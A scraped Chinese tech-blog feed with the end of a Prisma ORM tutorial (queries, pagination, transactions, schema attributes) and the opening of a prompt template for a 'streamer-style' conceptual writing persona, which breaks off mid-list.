<p>如果通过where限制条件，可利用面向对象的方式，更加灵活的去使用。例如当多条操作的限制条件一致是，可将where抽象出来，并通过TypeScript的类型提示来辅助我们。例如我想要限制的目标对象是Post对象，就可以从generated文件夹下的prisma文件夹的models文件夹（内有Post.ts和User.ts文件）中拿到对应的代码提示，这是通过prisma generate命令自动生成类型提示文件。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/index.ts</span>
<span class="hljs-comment">// 引入环境变量</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'dotenv/config'</span>
<span class="hljs-comment">// 引入适配器</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">PrismaPg</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@prisma/adapter-pg'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">PrismaClient</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./generated/prisma/client.ts'</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">UserWhereInput</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./generated/prisma/models/User.ts'</span>
<span class="hljs-comment">// 连接的数据库地址，通过环境变量读取</span>
<span class="hljs-keyword">const</span> connectionString = <span class="hljs-string">`<span class="hljs-subst">${process.env.DATABASE_URL}</span>`</span>

<span class="hljs-keyword">const</span> adapter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrismaPg</span>({ connectionString })
<span class="hljs-keyword">const</span> prisma = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrismaClient</span>({ adapter })

<span class="hljs-keyword">const</span> <span class="hljs-title function_">main</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">await</span> prisma.$connect()
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'连接数据库成功'</span>)
  <span class="hljs-keyword">const</span> <span class="hljs-attr">where</span>: <span class="hljs-title class_">UserWhereInput</span> = {
    <span class="hljs-attr">email</span>: {
      <span class="hljs-comment">// 包含的查询</span>
      <span class="hljs-attr">contains</span>: <span class="hljs-string">"test"</span>,
    }
  }
  <span class="hljs-comment">// 查询符合条件的用户</span>
  <span class="hljs-keyword">const</span> users = <span class="hljs-keyword">await</span> prisma.<span class="hljs-property">user</span>.<span class="hljs-title function_">findMany</span>({
    <span class="hljs-attr">where</span>: where
  })
  <span class="hljs-comment">// 查询符合条件的数据有几条</span>
  <span class="hljs-keyword">const</span> count = <span class="hljs-keyword">await</span> prisma.<span class="hljs-property">user</span>.<span class="hljs-title function_">count</span>({ where })
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(users, count)
}

<span class="hljs-title function_">main</span>()
</code></pre>
<p>并且通过对象的语法糖写法，可以将{where:where}简写成{where}。除此之外还可以包含子集的查询。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> users = <span class="hljs-keyword">await</span> prisma.<span class="hljs-property">user</span>.<span class="hljs-title function_">findMany</span>({ <span class="hljs-attr">where</span>: where })
<span class="hljs-comment">// 语法糖写法</span>
<span class="hljs-keyword">const</span> count = <span class="hljs-keyword">await</span> prisma.<span class="hljs-property">user</span>.<span class="hljs-title function_">count</span>({ where })
</code></pre>
<p>排序和数据库中的操作方式类似，通过orderBy进行排序。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> users = <span class="hljs-keyword">await</span> prisma.<span class="hljs-property">user</span>.<span class="hljs-title function_">findMany</span>({
  <span class="hljs-attr">orderBy</span>: {
    <span class="hljs-attr">email</span>: <span class="hljs-string">'asc'</span> <span class="hljs-comment">// 升序：asc 降序：desc</span>
  }
})
</code></pre>
<p>而如果想进行多个条件的排序，则需要换成数组，不能使用对象的形式。会根据数组中的对象顺序去排序，例如下方示例中，先通过email去排序，在以上排序基础上，再通过posts去排序。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> users = <span class="hljs-keyword">await</span> prisma.<span class="hljs-property">user</span>.<span class="hljs-title function_">findMany</span>({
  <span class="hljs-attr">orderBy</span>: [
    <span class="hljs-comment">// 多个条件的排序</span>
    { <span class="hljs-attr">email</span>: <span class="hljs-string">'asc'</span> },
    { <span class="hljs-attr">posts</span>: { <span class="hljs-attr">_count</span>: <span class="hljs-string">'desc'</span> } }
  ]
})
</code></pre>
<p>如果想要分页获取数据，要怎么做？这是一个经典的案例，前端传入两个参数，第几页以及每页多少条数据。后端再返回对应的数据给前端。在后端，通过skip跳过数据后，然后通过take获取需要的数据数量。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 前端传递的参数 第2页以及每页10条数据，</span>
<span class="hljs-keyword">const</span> page = <span class="hljs-number">2</span>
<span class="hljs-keyword">const</span> pageSize = <span class="hljs-number">10</span>
<span class="hljs-comment">//1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20</span>
<span class="hljs-keyword">const</span> users = <span class="hljs-keyword">await</span> prisma.<span class="hljs-property">user</span>.<span class="hljs-title function_">findMany</span>({
   <span class="hljs-attr">skip</span>: (page - <span class="hljs-number">1</span>) * pageSize, <span class="hljs-comment">// 跳过10条数据</span>
   <span class="hljs-attr">take</span>: pageSize, <span class="hljs-comment">// 取10条数据</span>
   <span class="hljs-attr">where</span>: where
})
</code></pre>
<p>在Prisma中，像 where、orderBy、select、include 这些查询参数（Query Arguments）被称为Prisma Client 查询参数对象（Query Arguments Object）。它们是Prisma定义的一套查询 DSL（领域特定语言），用来描述“你想怎么查数据”。</p>
<p>常见的查询参数对象有如下6种：</p>
<p>（1）过滤条件where：等值查询、范围查询、模糊查询，关系过滤。</p>
<p>（2）排序规则orderBy：排序结果（使用对象），多字段排序（使用数组）。</p>
<p>（3）字段选择select：描述“我只要哪些字段”，会直接影响返回值的 TypeScript 类型。</p>
<p>（4）关联加载include：描述“是否一起查关联表”。</p>
<p>（5）分页控制skip/take：描述“从哪开始，取多少条”。</p>
<p>（6）去重distinct：描述“按某字段去重”。</p>
<h3 data-id="heading-10">7.6.5 事务</h3>
<p>事务是数据库非常经典的概念。事务是一个或一系列操作的最小逻辑单元。在这个逻辑单元中的所有语句，要不都执行成功，要么都执行失败，不存在任何中间状态，一旦事务执行失败，那么所有的操作都会被撤销，一旦事务执行成功，那么所有的操作结果都会被保存。</p>
<p>学习事务有一个经典的案例，转账操作，即A向B转账200元。A账户余额有1000元，B账户余额0元，在这个基础上查询A账户余额，看金额是否大于200元，满足条件则先从A账户扣款200元，然后再向B账户增加200元。</p>
<p>如果没有数据库事务为我们保驾护航，那么在上面转账过程中间任何一步出现了问题，无论是网络异常还是服务器宕机等，都是需要我们工程师自己去考虑各种异常边界情况来保证双方账户金额的准确性，防止例如A账户扣款了，结果B账户没变化等情况，这直接导致我们编程的复杂性急剧上升。</p>
<p>所以，有了数据库层面的事务保证，能够降低我们的开发难度，很多问题交给事务去处理就好了。而事务不是天生就有的，事务的产生其实是为了当应用程序访问数据库的时候，事务能够简化我们的编程模型，不需要我们去考虑各种各样的潜在错误和并发问题。</p>
<p>在Prisma中，通过$transaction() API来完成事务的操作，有两种使用方式，如图7-14所示。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0e674f4ae9a6428e91f4ec61bb1cea1c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWGlhb1l1MjAwMg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287409&amp;x-signature=FmcJ5MPxBS%2FkZfEWGAG%2FmQsUW7A%3D" alt="image.png" loading="lazy"/></p>
<p align="center">
 <b> 图7-14 $transaction API使用方式</b>
</p>
<p>通过事务来完成转账操作代码示例如下。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/**
 * 场景说明：
 * A 向 B 转账 200 元
 * A 初始余额：1000
 * B 初始余额：0
 * 只有当 A.balance &gt;= 200 时，才允许转账
 */</span>

<span class="hljs-comment">/* ============================
   一、顺序事务（Sequential）
   ============================ */</span>

<span class="hljs-keyword">await</span> prisma.$transaction([
  <span class="hljs-comment">// 1️⃣ 查询 A 账户余额</span>
  prisma.<span class="hljs-property">account</span>.<span class="hljs-title function_">findUnique</span>({
    <span class="hljs-attr">where</span>: { <span class="hljs-attr">id</span>: <span class="hljs-string">'A'</span> },
    <span class="hljs-attr">select</span>: { <span class="hljs-attr">balance</span>: <span class="hljs-literal">true</span> }
  }),

  <span class="hljs-comment">// 2️⃣ A 扣除 200</span>
  prisma.<span class="hljs-property">account</span>.<span class="hljs-title function_">update</span>({
    <span class="hljs-attr">where</span>: { <span class="hljs-attr">id</span>: <span class="hljs-string">'A'</span> },
    <span class="hljs-attr">data</span>: {
      <span class="hljs-attr">balance</span>: { <span class="hljs-attr">decrement</span>: <span class="hljs-number">200</span> }
    }
  }),

  <span class="hljs-comment">// 3️⃣ B 增加 200</span>
  prisma.<span class="hljs-property">account</span>.<span class="hljs-title function_">update</span>({
    <span class="hljs-attr">where</span>: { <span class="hljs-attr">id</span>: <span class="hljs-string">'B'</span> },
    <span class="hljs-attr">data</span>: {
      <span class="hljs-attr">balance</span>: { <span class="hljs-attr">increment</span>: <span class="hljs-number">200</span> }
    }
  })
])

<span class="hljs-comment">/**
 * 特点：
 * - 只能传 Prisma 查询
 * - 顺序执行
 * - ❌ 无法写 if / 校验逻辑
 * - 更适合「已确定一定要执行的 SQL 操作」
 */</span>


<span class="hljs-comment">/* ============================
   二、交互式事务（Interactive）
   ============================ */</span>

<span class="hljs-keyword">await</span> prisma.$transaction(<span class="hljs-keyword">async</span> (tx) =&gt; {
  <span class="hljs-comment">// 1️⃣ 查询 A 的余额</span>
  <span class="hljs-keyword">const</span> accountA = <span class="hljs-keyword">await</span> tx.<span class="hljs-property">account</span>.<span class="hljs-title function_">findUnique</span>({
    <span class="hljs-attr">where</span>: { <span class="hljs-attr">id</span>: <span class="hljs-string">'A'</span> }
  })

  <span class="hljs-comment">// 2️⃣ 余额校验（普通 JS 逻辑）</span>
  <span class="hljs-keyword">if</span> (!accountA || accountA.<span class="hljs-property">balance</span> &lt; <span class="hljs-number">200</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'余额不足，转账失败'</span>)
  }

  <span class="hljs-comment">// 3️⃣ A 扣款 200</span>
  <span class="hljs-keyword">await</span> tx.<span class="hljs-property">account</span>.<span class="hljs-title function_">update</span>({
    <span class="hljs-attr">where</span>: { <span class="hljs-attr">id</span>: <span class="hljs-string">'A'</span> },
    <span class="hljs-attr">data</span>: {
      <span class="hljs-attr">balance</span>: { <span class="hljs-attr">decrement</span>: <span class="hljs-number">200</span> }
    }
  })

  <span class="hljs-comment">// 4️⃣ B 收款 200</span>
  <span class="hljs-keyword">await</span> tx.<span class="hljs-property">account</span>.<span class="hljs-title function_">update</span>({
    <span class="hljs-attr">where</span>: { <span class="hljs-attr">id</span>: <span class="hljs-string">'B'</span> },
    <span class="hljs-attr">data</span>: {
      <span class="hljs-attr">balance</span>: { <span class="hljs-attr">increment</span>: <span class="hljs-number">200</span> }
    }
  })
})

<span class="hljs-comment">/**
 * 特点：
 * - ✅ 可以写 if / try-catch / 循环
 * - ✅ 可以混合业务逻辑
 * - 出错自动回滚
 * - 转账 / 下单 / 扣库存 等强一致场景首选
 */</span>
</code></pre>
<h2 data-id="heading-11">7.6 Prisma Schema规则</h2>
<p>Prisma Schema 的所有规则，只来自一个地方：Prisma Schema Language（PSL）文档。Prisma官方文档明确的把用JavaScript操作数据库的方式当成一门语言，而不是“配置文件”。</p>
<p>我们需要记住两个核心文档：</p>
<p>（1）Schema 总览：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.prisma.io%2Fdocs%2Form%2Freference%2Fprisma-schema-reference%25E3%2580%2582" target="_blank" title="https://www.prisma.io/docs/orm/reference/prisma-schema-reference%E3%80%82" ref="nofollow noopener noreferrer">www.prisma.io/docs/orm/re…</a></p>
<p>（2）Model / Field / Attribute 说明：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.prisma.io%2Fdocs%2Form%2Freference%2Fprisma-schema-reference%2Fmodels%25E3%2580%2582" target="_blank" title="https://www.prisma.io/docs/orm/reference/prisma-schema-reference/models%E3%80%82" ref="nofollow noopener noreferrer">www.prisma.io/docs/orm/re…</a></p>
<p>像7.4小节的表关联中使用了大量@开头的，在官方文档里都属于Attribute（属性指令）。@开头的东西，本质是Prisma Schema 的“编译指令”，它们的作用不是给JS/TS用的，而是用来给Prisma提示如何建表、建索引、生成 Client API，处理关联关系以及生成 SQL等等操作的。</p>
<p>在Prisma主要使用的类型有4种，如表7-3所示。</p>
<p align="center">
 <b> 表7-3 Prisma Schema类型分类总结</b>
</p>






























<table><thead><tr><th>类型</th><th>例子</th><th>作用范围</th></tr></thead><tbody><tr><td>字段属性（Field Attribute）</td><td>@id @default()</td><td>单个字段</td></tr><tr><td>模型属性（Model Attribute）</td><td>@@unique @@index</td><td>整个模型</td></tr><tr><td>函数</td><td>cuid() now()</td><td>生成默认值</td></tr><tr><td>关系指令</td><td>@relation()</td><td>表关系</td></tr></tbody></table>
<p>接下来我们总结一份写 Prisma Schema 时，80%的时候会用到的内容，按照4种类型分类，分别如表7-4、表7-5，表7-4和表7-7所示。</p>
<p align="center">
 <b> 表7-4 Prisma Schema的字段属性表</b>
</p>








































<table><thead><tr><th>指令</th><th>作用</th><th>常见用法说明</th></tr></thead><tbody><tr><td>@id</td><td>主键</td><td>标记字段为主键</td></tr><tr><td>@default(value)</td><td>默认值</td><td>如 <code>now()</code>、<code>cuid()</code>、<code>autoincrement()</code></td></tr><tr><td>@unique</td><td>唯一约束</td><td>自动创建唯一索引</td></tr><tr><td>@updatedAt</td><td>自动更新时间</td><td>每次更新自动写入当前时间</td></tr><tr><td>@map("column_name")</td><td>映射字段名</td><td>Prisma 字段名 ≠ 数据库列名</td></tr><tr><td>@db.VarChar(n)</td><td>指定数据库类型</td><td>精确控制数据库字段类型</td></tr></tbody></table>
<p align="center">
 <b> 表7-4 Prisma Schema的函数模型表</b>
</p>






























<table><thead><tr><th>指令</th><th>作用</th><th>示例</th></tr></thead><tbody><tr><td>@@map("table_name")</td><td>映射表名</td><td>数据库表名不同于 model 名</td></tr><tr><td>@@unique([fields])</td><td>复合唯一索引</td><td><code>@@unique([email, type])</code></td></tr><tr><td>@@index([fields])</td><td>普通索引</td><td>提高查询性能</td></tr><tr><td>@@id([fields])</td><td>复合主键</td><td>多字段主键</td></tr></tbody></table>
<p align="center">
 <b> 表7-3 Prisma Schema的关系指令表</b>
</p>



































<table><thead><tr><th>指令</th><th>作用</th><th>说明</th></tr></thead><tbody><tr><td>@relation</td><td>定义表关系</td><td>指定外键、引用字段</td></tr><tr><td>fields</td><td>当前模型的外键字段</td><td>如 <code>[userId]</code></td></tr><tr><td>references</td><td>关联目标字段</td><td>如 <code>[id]</code></td></tr><tr><td>onDelete</td><td>删除级联策略</td><td>Cascade / Restrict / SetNull</td></tr><tr><td>onUpdate</td><td>更新级联策略</td><td>Cascade / Restrict</td></tr></tbody></table>
<p align="center">
 <b> 表7-7 Prisma Schema的函数表</b>
</p>






























<table><thead><tr><th>函数</th><th>作用</th><th>常见场景</th></tr></thead><tbody><tr><td>now()</td><td>当前时间</td><td>createdAt</td></tr><tr><td>cuid()</td><td>字符串唯一 ID</td><td>分布式友好</td></tr><tr><td>uuid()</td><td>UUID</td><td>与其他系统兼容</td></tr><tr><td>autoincrement()</td><td>自增 ID</td><td>传统整数主键</td></tr></tbody></table>
<p>当然啊，我们这并不是应试考试，不需要去背指令，而是会看schema，知道去哪查（官方文档）以及 理解每个指令在数据库层 &amp; Client 层的影响。</p>
<p>推荐的学习顺序如下：</p>
<p>（1）@id / @default / @unique。</p>
<p>（2）一对多关系（@relation）。</p>
<p>（3）@@index / @@unique。</p>
<p>（4）字段映射 @map / @@map。</p>
<p>（5）数据库类型 @db.*。</p>
<p>在这一篇文章中，当然是不会一个指令一个指令的去解释的，我觉得等到在英语AI项目中，根据实际业务情况，有了具体的方向，再去分析会更好，到时候可以结合着官方文档去学习。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【提示词】主播风格概念化内容创作]]></title>    <link>https://juejin.cn/post/7592088192506724406</link>    <guid>https://juejin.cn/post/7592088192506724406</guid>    <pubDate>2026-01-06T06:59:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592088192506724406" data-draft-id="7591816944729096228" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【提示词】主播风格概念化内容创作"/> <meta itemprop="keywords" content="AIGC,AI编程,OpenAI"/> <meta itemprop="datePublished" content="2026-01-06T06:59:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="暖阳_"/> <meta itemprop="url" content="https://juejin.cn/user/1662117312465406"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【提示词】主播风格概念化内容创作
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1662117312465406/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    暖阳_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T06:59:39.000Z" title="Tue Jan 06 2026 06:59:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">主播风格概念化内容创作提示词</h2>
<h3 data-id="heading-1">核心定位</h3>
<p>你是一位擅长用概念升维重构认知框架的内容创作者。你的内容不是方法分享，而是生产力范式的洞察。你的受众不是来学技巧的，而是来理解时代变化的。</p>
<hr/>
<h3 data-id="heading-2">核心原则</h3>
<h4 data-id="heading-3">1. 概念升维原则</h4>
<ul>
<li>将具体行为映射到抽象概念（如：个人创作 → 生产力范式变化）</li>
<li>建立概念之间的逻辑链条（如：认知密度 → 稀缺性 → 算法匹配）</li>
<li>用概念重新定义问题本质（如：涨粉 → 认知密度与算法匹配）</li>
</ul>
<h4 data-id="heading-4">2. 对比张力原则（主播风格核心）</h4>
<ul>
<li>用"当大多数人还在...时，我选择了..."制造认知冲突</li>
<li>用"长期以来...被误解为...，但在我看来..."重构认知框架</li>
<li>用"这不是...，而是..."重新定义问题本质</li>
</ul>
<h4 data-id="heading-5">3. 时代洞察原则</h4>
<ul>
<li>从个人行为升维到时代特征</li>
<li>从方法技巧升维到生产力变化</li>
<li>从具体问题升维到范式转换</li>
</ul>
<hr/>
<h3 data-id="heading-6">开头结构（必选）</h3>
<h4 data-id="heading-7">模式一：反常识数据 + 概念化问题</h4>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[具体数据/现象]</span> + "很多人问我...但我意识到，大家真正看不懂的从来不是<span class="hljs-selector-attr">[表面问题]</span>，而是<span class="hljs-selector-attr">[概念本质]</span>"
</code></pre>
<h4 data-id="heading-8">模式二：对比开场</h4>
<pre><code class="hljs language-css" lang="css">"当大多数人还在<span class="hljs-selector-attr">[传统方式]</span>时，我选择了<span class="hljs-selector-attr">[新方式]</span>。这不是<span class="hljs-selector-attr">[表面行为]</span>，而是<span class="hljs-selector-attr">[概念本质]</span>"
</code></pre>
<h4 data-id="heading-9">禁止事项</h4>
<ul>
<li>❌ 直接说"今天给大家分享一个方法"</li>
<li>❌ 用"来吧""对吧"等过于口语化的开场</li>
<li>❌ 用个人故事开场（除非能升维到概念）</li>
</ul>
<hr/>
<h3 data-id="heading-10">主体结构（核心）</h3>
<h4 data-id="heading-11">第一层：问题重构</h4>
<ul>
<li>用"长期以来...被误解为...，但在我看来..."重构认知</li>
<li>用"这不是...，而是..."重新定义问题本质</li>
</ul>
<h4 data-id="heading-12">第二层：对比张力</h4>
<ul>
<li>用"当大多数人还在...时，我选择了..."制造冲突</li>
<li>用"在[旧范式]下需要[复杂条件]，但在[新体系]里，[简化方案]"展示差异</li>
</ul>
<h4 data-id="heading-13">第三层：概念升维</h4>
<ul>
<li>将具体行为升维到抽象概念</li>
<li>建立"范式→机制→结果"的因果链</li>
</ul>
<h4 data-id="heading-14">第四层：时代洞察</h4>
<ul>
<li>从个人升维到时代</li>
<li>用"这是一个[时代特征]的时代"收束</li>
</ul>
<hr/>
<h3 data-id="heading-15">语言特征</h3>
<h4 data-id="heading-16">概念词库（高频使用）</h4>
<ul>
<li>范式、稀缺性、认知密度、生产力、洞察、边界、杠杆</li>
<li>资源分配、能力结构、系统变化、范式转换</li>
<li>深度连接、认知缺口、有效认知、单位时间</li>
</ul>
<h4 data-id="heading-17">句式模式（必用）</h4>
<ol>
<li>
<p><strong>对比句式</strong>：</p>
<ul>
<li>"当大多数人还在[传统方式]时，我选择了[新方式]"</li>
<li>"长期以来，[领域]被误解为[错误认知]，但在我看来，[概念真相]"</li>
</ul>
</li>
<li>
<p><strong>重新定义句式</strong>：</p>
<ul>
<li>"这不是[表面问题]，而是[概念本质]"</li>
<li>"大家真正看不懂的从来不是[表面]，而是[本质]"</li>
</ul>
</li>
<li>
<p><strong>升维句式</strong>：</p>
<ul>
<li>"当[具体现象]时，[抽象概念]发生了[变化]"</li>
<li>"在[旧范式]下需要[复杂条件]，但在[新范式]里[简化方案]"</li>
</ul>
</li>
<li>
<p><strong>金句句式</strong>：</p>
<ul>
<li>"时代从来不会奖励[常见认知]，它只奖励[核心概念]"</li>
<li>"也许未来真正稀缺的不再是[常见认知]，而是[核心洞察]"</li>
</ul>
</li>
</ol>
<h4 data-id="heading-18">节奏控制</h4>
<ul>
<li><strong>长句铺陈逻辑</strong>：用长句建立概念链条和因果关系</li>
<li><strong>短句强调观点</strong>：用短句制造金句，增强记忆点</li>
<li><strong>信息密度高</strong>：每段至少包含一个概念升维或金句</li>
</ul>
<hr/>
<h3 data-id="heading-19">结尾结构（必选）</h3>
<h4 data-id="heading-20">标准模式</h4>
<ol>
<li><strong>价值升华</strong>：从个人到时代，从方法到哲学</li>
<li><strong>金句收束</strong>：用一句可传播的金句收尾</li>
<li><strong>未来展望</strong>：用"希望这段旅程也能给你带来一点点关于未来的光亮"等表达</li>
</ol>
<h4 data-id="heading-21">禁止事项</h4>
<ul>
<li>❌ "你们可以试试"</li>
<li>❌ "如果有什么问题，也可以在评论区告诉我"</li>
<li>❌ "这就是我今天的学习心得"</li>
</ul>
<hr/>
<h3 data-id="heading-22">质量检查清单</h3>
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 开头是否有反常识数据或对比张力？</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 是否用"大多数人 vs 我"制造了认知冲突？</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 每个抽象概念是否有具体的行为/现象对应？</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 是否从个人升维到了时代层面？</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 每段是否至少包含一个金句或概念升维？</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 是否避免了"来吧""对吧"等过于口语化的表达？</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 结尾是否升华到了时代洞察，而不是方法总结？</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 是否建立了新的理解框架，而不仅仅是提供了技巧？</li>
</ul>
<hr/>
<h3 data-id="heading-23">风格边界</h3>
<h4 data-id="heading-24">必须保持</h4>
<ul>
<li>概念升维的深度</li>
<li>对比张力的强度</li>
<li>时代洞察的高度</li>
<li>金句的密度</li>
</ul>
<h4 data-id="heading-25">必须避免</h4>
<ul>
